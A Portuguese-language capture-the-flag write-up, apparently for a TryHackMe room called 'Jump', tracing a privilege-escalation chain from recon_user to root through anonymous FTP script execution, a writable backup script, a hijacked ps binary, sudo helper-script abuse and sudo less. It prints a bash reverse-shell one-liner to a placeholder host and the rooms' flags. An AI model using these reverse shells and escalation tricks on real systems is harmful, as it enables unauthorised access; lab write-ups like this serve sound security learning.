# 🎯 Escalada Encadeada: Jump

**Cadeia de Ataque:** `recon_user` ──> `dev_user` ──> `monitor_user` ──> `ops_user` ──> `root`

## 🔑 Tabela Geral de Credenciais & Flags

| **Usuário**      | **Credenciais / Vetor**                                                                                                                                                                                                                                                                                                                                                              | **Flag Capturada**                        | **Status** |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------- | ---------- |
| **recon_user**   | O servidor ftp permitia login como anonyumous , com isso tinha um README.txt que informava que qualquer script colocado na pasta /incoming era executado , com isso coloquei um shell reverse e ganhei acesso como recon_user.                                                                                                                                                       | THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11} | 🟢         |
| **dev_user**     | Estando como recon_user eu tinha permissão de escrita em um arquivo backup.sh que era do dev_user , editei e coloquei um shell reverse. Mas para ler o arquivo flag.txt de dev_user eu podia ler ele pois estava no grupo dev_user e tinha acesso a seu home.                                                                                                                        | THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123} | 🟢         |
| **monitor_user** | Como dev_user eu pude mudar um executável chamado ps que era chamado por um script healthcheck do monitor_user , com isso coloquei um reverse shell nele e quando healthcheck do monitor_user foi executado recebi shell como monitor_user.                                                                                                                                          | THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77} | 🟢         |
| **ops_user**     | Como monitor_user eu podia executar com sudo se passando por ops_user um certo script que ele em si eu não podia modificar mas o script auxiliar que ele executava eu podia ,então nesse script eu coloquei um reverse shell e executei o script original assim "sudo -u ops_user /usr/local/bin/deploy.sh" , sudo -u ops_user permite eu poder executar esse script como ops_user . | THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88} | 🟢         |
| **root**         | Como ops_user eu podia usar o comando less como sudo sem senha , com isso usei "sudo less /root/flag.txt"                                                                                                                                                                                                                                                                            | THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22} | 🟢         |

---
## Script principal utilizado
```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'
```


## 📝 Lições Aprendidas & Retrospectiva

- **O que me fez travar?** Como a sala era TODA baseada somente em escalação por script eu me perdi procurando por outros vetores e toda vez que via que era por script eu ainda chegava a desconfiar.
    
- **Novo conceito/ferramenta aprendida:** sudo -u (user) quando no sudo -l dizer que você pode executar algo como um certo usuário você tem de usar isso.